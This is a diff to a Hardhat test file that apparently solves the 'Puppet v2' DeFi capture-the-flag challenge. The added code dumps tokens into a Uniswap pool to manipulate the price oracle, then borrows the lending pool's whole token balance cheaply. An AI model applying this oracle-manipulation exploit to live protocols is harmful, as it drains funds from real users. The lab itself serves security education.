@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -14,6 +15,8 @@ describe('[Challenge] Puppet v2', function () {
 
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
+
+    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('20');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
@@ -82,6 +85,31 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        const amounts = await this.uniswapRouter.connect(attacker).callStatic.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            await ethers.utils.parseEther('0'),
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            await ethers.utils.parseEther('0'),
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        console.log( (await this.weth.balanceOf(attacker.address)).toString() );
+        console.log( (await ethers.provider.getBalance(attacker.address)).toString() );
+        await this.weth.connect(attacker).deposit({ value: BigNumber.from('19900000000000000000') });
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, await this.weth.balanceOf(attacker.address));
+        await this.lendingPool.connect(attacker).borrow(    
+            POOL_INITIAL_TOKEN_BALANCE
+        );
     });
 
     after(async function () {
